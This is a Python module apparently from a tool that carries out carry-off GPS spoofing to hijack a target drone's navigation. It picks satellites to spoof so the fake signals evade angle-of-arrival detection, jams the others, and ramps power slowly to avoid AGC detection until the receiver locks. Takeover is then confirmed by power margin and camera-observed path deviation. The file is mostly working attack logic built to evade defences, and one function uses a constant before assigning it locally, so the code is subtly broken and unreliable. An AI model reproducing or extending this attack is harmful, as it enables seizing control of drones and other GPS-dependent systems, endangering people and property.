"""
carry_off.py
============
Core carry-off GPS spoofing implementation.

Implements:
- Selective satellite spoofing for AoA defeat
- Perfect signal synchronization
- Gradual power takeover
- Takeover confirmation via power and camera
"""

import time
import math
import logging
import numpy as np
from pathlib import Path


class CarryOff:
    """
    Executes carry-off GPS spoofing attack.

    AoA defeat strategy: only transmit signals for satellites
    within 45 degrees of interceptor azimuth (315 NW).
    Their signals arrive from a geometrically plausible direction
    making AoA detection indistinguishable from real reception.

    Non-NW satellites are selectively jammed at low power to
    remove signals that would arrive from wrong directions.
    """

    def __init__(self, sat_geometry, signal_generator,
                 power_controller, pseudorange_controller, config):
        self.sat_geo = sat_geometry
        self.sig_gen = signal_generator
        self.power_ctrl = power_controller
        self.pseudo_ctrl = pseudorange_controller
        self.config = config

        self.interceptor_azimuth = config['spoofing']['interceptor_azimuth_deg']
        self.azimuth_tolerance = config['spoofing']['satellite_azimuth_tolerance_deg']
        self.min_spoofable = config['spoofing']['min_spoofable_satellites']

        self.spoofable_sats = []
        self.jammable_sats = []
        self.synchronized = False
        self.takeover_confirmed = False
        self.phase = 'idle'

        self.logger = logging.getLogger('CarryOff')

    def select_satellites(self, visible_sats):
        """
        Classify satellites as SPOOF or JAM using interceptor azimuth.

        This is the core AoA defeat mechanism. Only satellites
        near the NW sky quadrant (315 degrees) are spoofed.
        Their signals naturally arrive from the interceptor direction.

        Args:
            visible_sats: list from sat_geometry.get_visible_satellites()

        Returns:
            (spoofable, jammable) lists
        """
        spoofable, jammable = \
            self.sat_geo.classify_satellites_by_interceptor_position(
                visible_sats,
                interceptor_azimuth_deg=self.interceptor_azimuth,
                azimuth_tolerance_deg=self.azimuth_tolerance,
                min_spoofable=self.min_spoofable
            )

        self.spoofable_sats = spoofable
        self.jammable_sats = jammable

        print(f"\n[CARRY-OFF] Satellite classification (interceptor at "
              f"{self.interceptor_azimuth}° NW ±{self.azimuth_tolerance}°):")
        print(f"{'PRN':>4} | {'Azimuth':>8} | {'Elevation':>9} | "
              f"{'Az Diff':>8} | {'Role':>8} | {'Reason'}")
        print("-" * 70)

        for sat in sorted(visible_sats, key=lambda s: s['azimuth_deg']):
            role = sat.get('role', 'JAM')
            reason = sat.get('role_reason', 'azimuth_window' if role == 'SPOOF'
                             else 'outside_window')
            print(f"{sat['prn']:>4} | {sat['azimuth_deg']:>7.1f}° | "
                  f"{sat['elevation_deg']:>8.1f}° | "
                  f"{sat.get('azimuth_diff_deg', 0):>7.1f}° | "
                  f"{role:>8} | {reason}")

        print(f"\n[CARRY-OFF] Spoofing {len(spoofable)} satellites, "
              f"jamming {len(jammable)} satellites")
        print(f"[CARRY-OFF] AoA defeat: all spoofed signals arrive from "
              f"geometrically plausible NW sky direction")

        return spoofable, jammable

    def synchronize(self, satellite_params):
        """
        Phase 3 — Build perfect signal replica synchronized to real GPS.

        Only synchronizes spoofable satellites (NW quadrant).
        Jammable satellites will be selectively suppressed.

        Args:
            satellite_params: dict from reconnaissance scan

        Returns:
            composite_signal array or None in simulation mode
        """
        self.phase = 'synchronizing'
        print(f"\n[CARRY-OFF] === PHASE 3: SYNCHRONIZATION ===")
        print(f"[CARRY-OFF] Building replicas for {len(self.spoofable_sats)} "
              f"NW-quadrant satellites only")

        sync_params = []
        print(f"\n{'PRN':>4} | {'Doppler':>10} | {'Code Phase':>11} | "
              f"{'Nav Bit':>8} | Status")
        print("-" * 60)

        for sat in self.spoofable_sats:
            prn = sat['prn']
            doppler = sat['doppler_hz']
            pseudorange = sat['pseudorange_m']
            code_phase = (pseudorange / SPEED_OF_LIGHT *
                          self.config['gps']['ca_chip_rate_hz']) % 1023

            sync_params.append({
                'prn': prn,
                'doppler_hz': doppler,
                'pseudorange_m': pseudorange,
                'code_phase': code_phase,
                'nav_bit': 1
            })

            time.sleep(0.15)
            print(f"{prn:>4} | {doppler:>+9.1f}Hz | "
                  f"{code_phase:>10.3f}ch | "
                  f"{'+1':>8} | SYNCHRONIZED ✓")

        print(f"\n[CARRY-OFF] {len(sync_params)} satellites synchronized")
        print(f"[CARRY-OFF] Jammable satellites ({len(self.jammable_sats)}): "
              f"{[s['prn'] for s in self.jammable_sats]}")
        print(f"[CARRY-OFF] Selective jamming will suppress non-NW PRNs")
        print(f"[CARRY-OFF] Signal replica ready — transmitter still OFF")

        self.synchronized = True
        self.phase = 'synchronized'

        SPEED_OF_LIGHT = self.config['gps']['speed_of_light_ms']

        return sync_params

    def execute_takeover(self, target_distance_m=12.0):
        """
        Phase 4 — Gradual power ramp until capture threshold crossed.

        Ramps at 0.6 dB/s to avoid AGC detection.
        Capture occurs at +3dB margin over real signal.

        Args:
            target_distance_m: distance to target drone in meters

        Returns:
            True if takeover confirmed, False if timeout
        """
        self.phase = 'power_ramp'
        print(f"\n[CARRY-OFF] === PHASE 4: POWER TAKEOVER ===")
        print(f"[CARRY-OFF] Target distance: {target_distance_m:.1f}m")
        print(f"[CARRY-OFF] Ramp rate: "
              f"{self.config['spoofing']['power_ramp_db_per_sec']} dB/s")
        print(f"[CARRY-OFF] Capture threshold: "
              f"+{self.config['spoofing']['capture_threshold_db']} dB\n")

        print(f"{'Power(dB)':>10} | {'Margin(dB)':>10} | "
              f"{'AGC Delta':>10} | {'Lock Status':>20}")
        print("-" * 60)

        max_time = 60.0
        start = time.time()

        while time.time() - start < max_time:
            current_db = self.power_ctrl.ramp_power(dt=2.0)
            confirmed, margin = self.power_ctrl.check_takeover(
                target_distance_m)

            if current_db < -3:
                lock_status = "REAL SATELLITES"
            elif current_db < 0:
                lock_status = "TRANSITIONING..."
            else:
                lock_status = "SPOOFED SIGNALS ✓"

            agc_delta = self.config['spoofing']['power_ramp_db_per_sec']

            print(f"{current_db:>+9.1f}dB | {margin:>+9.1f}dB | "
                  f"{agc_delta:>9.2f}/s | {lock_status:>20}")

            if confirmed:
                self.takeover_confirmed = True
                self.phase = 'takeover_confirmed'
                print(f"\n[CARRY-OFF] *** RECEIVER LOCKED — SPOOFING ACTIVE ***")
                print(f"[CARRY-OFF] Target GPS receiver tracking spoofed signals")
                print(f"[CARRY-OFF] Spoofing {len(self.spoofable_sats)} NW satellites")
                print(f"[CARRY-OFF] {len(self.jammable_sats)} non-NW satellites jammed")
                return True

            time.sleep(2.0)

        print(f"[CARRY-OFF] WARNING: Takeover timeout after {max_time}s")
        return False

    def verify_takeover(self, camera_deviation_m=0.0):
        """
        Confirm takeover via power threshold and camera deviation.

        Two independent confirmation methods:
        1. Power margin calculation (theoretical)
        2. Camera-observed flight path deviation (empirical ground truth)

        Args:
            camera_deviation_m: deviation from expected path in meters

        Returns:
            (confirmed, confidence, method)
        """
        power_confirmed = self.takeover_confirmed
        camera_confirmed = camera_deviation_m > 0.5

        if power_confirmed and camera_confirmed:
            confidence = 0.99
            method = 'both_indicators'
        elif power_confirmed:
            confidence = 0.75
            method = 'power_only'
        elif camera_confirmed:
            confidence = 0.85
            method = 'camera_only'
        else:
            confidence = 0.0
            method = 'unconfirmed'

        print(f"[CARRY-OFF] Takeover verification:")
        print(f"  Power threshold: {'✓' if power_confirmed else '✗'}")
        print(f"  Camera deviation: {camera_deviation_m:.2f}m "
              f"({'✓' if camera_confirmed else '✗'})")
        print(f"  Confidence: {confidence:.0%} ({method})")

        return power_confirmed or camera_confirmed, confidence, method

    def get_phase_status(self):
        """Returns current phase name and completion estimate."""
        phases = ['idle', 'synchronizing', 'synchronized',
                  'power_ramp', 'takeover_confirmed']
        idx = phases.index(self.phase) if self.phase in phases else 0
        completion = idx / (len(phases) - 1) * 100
        return self.phase, completion


SPEED_OF_LIGHT = 299792458.0
